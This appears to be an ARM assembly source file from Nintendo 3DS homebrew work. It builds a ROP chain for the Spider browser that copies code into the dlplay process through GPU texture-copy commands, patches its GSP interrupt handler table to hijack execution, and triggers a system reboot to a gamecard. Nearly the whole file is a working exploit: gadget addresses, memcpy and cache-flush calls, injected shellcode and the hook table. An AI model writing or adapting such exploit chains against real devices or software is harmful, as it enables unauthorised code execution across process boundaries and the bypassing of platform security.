;This goes at 0x16000 in the launcher.dat
.nds

.create "spider_rop_5x_6x.bin",0x0

;define constants
DLPLAY_CODE_LOC_VA equ 0x00192800
DLPLAY_CODE_LOC equ (DLPLAY_CODE_LOC_VA-0x00100000+0x03F50000+0x14000000)
DLPLAY_HOOK_LOC equ (0x1A3500-0x00100000+0x03F50000+0x14000000)
DLPLAY_NSSHANDLE_LOC_VA equ 0x001A5200

SPIDER_GSPHEAPBUF equ 0x18410000
SPIDER_ROP_LOC equ 0x08F01000


spiderRop:
	;copy code to dlplay
		;copy patch
			.word 0x0012A3D4 ; LDMFD   SP!, {R0-R4,PC}
				.word SPIDER_GSPHEAPBUF ; r0 (dst)
				.word SPIDER_ROP_LOC+dlplayCode ; r1 (src)
				.word dlplayCode_end-dlplayCode ; r2 (size)
				.word 0xDEADC0DE ; r3 (garbage)
				.word 0xDEADC0DE ; r4 (garbage)
			.word 0x00240B5C ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
				.word 0xDEADC0DE ; r4 (garbage)
				.word 0xDEADC0DE ; r5 (garbage)
				.word 0xDEADC0DE ; r6 (garbage)
				.word 0xDEADC0DE ; r7 (garbage)
				.word 0xDEADC0DE ; r8 (garbage)
				.word 0xDEADC0DE ; r9 (garbage)
				.word 0xDEADC0DE ; r10 (garbage)

		;flush data cache
			.word 0x0012A3D4 ; pop {r0, r1, r2, r3, r4, pc}
				.word 0x003DA72C ; r0 (handle ptr)
				.word 0xFFFF8001 ; r1 (kprocess handle)
				.word SPIDER_GSPHEAPBUF  ; r2 (address)
				.word 0x00000200 ; r3 (size)
				.word 0xDEADC0DE ; r4 (garbage)
			.word 0x001303A4 ; pop {lr, pc}
				.word 0x001057E0 ; lr (pop {pc})
			.word 0x0012C228 ; GSPGPU_FlushDataCache

		;send GX command
			.word 0x0010C320 ; pop {r0, pc}
				.word 0x3D7C40+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
			.word 0x00228B10 ; pop {r1, pc}
				.word SPIDER_ROP_LOC+gxCommand ; r1 (cmd addr)
			.word 0x001303A4 ; pop {lr, pc}
				.word 0x001057E0 ; lr (pop {pc})
			.word 0x0012BF4C ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue

		;sleep for a bit
			.word 0x0010C320 ; pop {r0, pc}
				.word 500000000 ; r0 (half second)
			.word 0x00228B10 ; pop {r1, pc}
				.word 0x00000000 ; r1 (nothing)
			.word 0x001303A4 ; pop {lr, pc}
				.word 0x001057E0 ; lr (pop {pc})
			.word 0x0010420C ; svc 0xa | bx lr

	;copy gsp interrupt handler table to linear heap
		;flush data cache
			.word 0x0012A3D4 ; pop {r0, r1, r2, r3, r4, pc}
				.word 0x003DA72C ; r0 (handle ptr)
				.word 0xFFFF8001 ; r1 (kprocess handle)
				.word SPIDER_GSPHEAPBUF  ; r2 (address)
				.word 0x00000200 ; r3 (size)
				.word 0xDEADC0DE ; r4 (garbage)
			.word 0x001303A4 ; pop {lr, pc}
				.word 0x001057E0 ; lr (pop {pc})
			.word 0x0012C228 ; GSPGPU_FlushDataCache

		;send GX command
			.word 0x0010C320 ; pop {r0, pc}
				.word 0x3D7C40+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
			.word 0x00228B10 ; pop {r1, pc}
				.word SPIDER_ROP_LOC+gxCommand2 ; r1 (cmd addr)
			.word 0x001303A4 ; pop {lr, pc}
				.word 0x001057E0 ; lr (pop {pc})
			.word 0x0012BF4C ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue

		;sleep for a bit
			.word 0x0010C320 ; pop {r0, pc}
				.word 500000000 ; r0 (half second)
			.word 0x00228B10 ; pop {r1, pc}
				.word 0x00000000 ; r1 (nothing)
			.word 0x001303A4 ; pop {lr, pc}
				.word 0x001057E0 ; lr (pop {pc})
			.word 0x0010420C ; svc 0xa | bx lr

	;copy gsp interrupt handler table back to dlplay after patching it
		;patch table
			.word 0x0012A3D4 ; LDMFD   SP!, {R0-R4,PC}
				.word SPIDER_GSPHEAPBUF+0x90 ; r0 (dst)
				.word SPIDER_ROP_LOC+dlplayHook ; r1 (src)
				.word dlplayHook_end-dlplayHook ; r2 (size)
				.word 0xDEADC0DE ; r3 (garbage)
				.word 0xDEADC0DE ; r4 (garbage)
			.word 0x00240B5C ; memcpy (ends in LDMFD   SP!, {R4-R10,LR})
				.word 0xDEADC0DE ; r4 (garbage)
				.word 0xDEADC0DE ; r5 (garbage)
				.word 0xDEADC0DE ; r6 (garbage)
				.word 0xDEADC0DE ; r7 (garbage)
				.word 0xDEADC0DE ; r8 (garbage)
				.word 0xDEADC0DE ; r9 (garbage)
				.word 0xDEADC0DE ; r10 (garbage)

		;flush data cache
			.word 0x0012A3D4 ; pop {r0, r1, r2, r3, r4, pc}
				.word 0x003DA72C ; r0 (handle ptr)
				.word 0xFFFF8001 ; r1 (kprocess handle)
				.word SPIDER_GSPHEAPBUF  ; r2 (address)
				.word 0x00000200 ; r3 (size)
				.word 0xDEADC0DE ; r4 (garbage)
			.word 0x001303A4 ; pop {lr, pc}
				.word 0x001057E0 ; lr (pop {pc})
			.word 0x0012C228 ; GSPGPU_FlushDataCache

		;send GX command
			.word 0x0010C320 ; pop {r0, pc}
				.word 0x3D7C40+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
			.word 0x00228B10 ; pop {r1, pc}
				.word SPIDER_ROP_LOC+gxCommand3 ; r1 (cmd addr)
			.word 0x001303A4 ; pop {lr, pc}
				.word 0x001057E0 ; lr (pop {pc})
			.word 0x0012BF4C ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue

		;trigger spider crash to return to menu
			.word 0xFFFFFFFF

	; copy code stub to end of dlplay .text
	.align 0x4
	gxCommand:
		.word 0x00000004 ;command header (SetTextureCopy)
		.word SPIDER_GSPHEAPBUF ;source address
		.word DLPLAY_CODE_LOC ;destination address
		.word 0x200 ;size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused

	; copy gsp interrupt handler ptr table to spider linear heap
	.align 0x4
	gxCommand2:
		.word 0x00000004 ;command header (SetTextureCopy)
		.word DLPLAY_HOOK_LOC ;source address
		.word SPIDER_GSPHEAPBUF ;destination address
		.word 0x200 ;size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused

	; copy gsp interrupt handler ptr table back to dplay for spider linear heap
	.align 0x4
	gxCommand3:
		.word 0x00000004 ;command header (SetTextureCopy)
		.word SPIDER_GSPHEAPBUF ;source address
		.word DLPLAY_HOOK_LOC ;destination address
		.word 0x200 ;size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused

	.align 0x4
	dlplayCode:
		ldr r0, =DLPLAY_NSSHANDLE_LOC_VA ; ns:s handle location
		ldr r0, [r0]

		mrc p15, 0, r1, c13, c0, 3
		add r1, 0x80
		ldr r2, =0x00100180 ; NSS:RebootSystem
		str r2, [r1], #4
		ldr r2, =0x00000001 ; flag
		str r2, [r1], #4
		ldr r2, =0x00000000 ; lower word PID (0 for gamecard)
		str r2, [r1], #4
		ldr r2, =0x00000000 ; upper word PID
		str r2, [r1], #4
		ldr r2, =0x00000002 ; mediatype (2 for gamecard)
		str r2, [r1], #4
		ldr r2, =0x00000000 ; reserved
		str r2, [r1], #4
		ldr r2, =0x00000000 ; flag
		str r2, [r1], #4

		.word 0xef000032 ; svc 0x32 (sendsyncrequest)

		;sleep forever and ever...
		ldr r0, =0xFFFFFFFF
		ldr r1, =0x0FFFFFFF
		.word 0xef00000a ; svc 0xa (sleep)

		.pool
	dlplayCode_end:

	.align 0x4
	dlplayHook:
		.word DLPLAY_CODE_LOC_VA, DLPLAY_CODE_LOC_VA, DLPLAY_CODE_LOC_VA, DLPLAY_CODE_LOC_VA
		.word DLPLAY_CODE_LOC_VA, DLPLAY_CODE_LOC_VA
	dlplayHook_end:

.Close
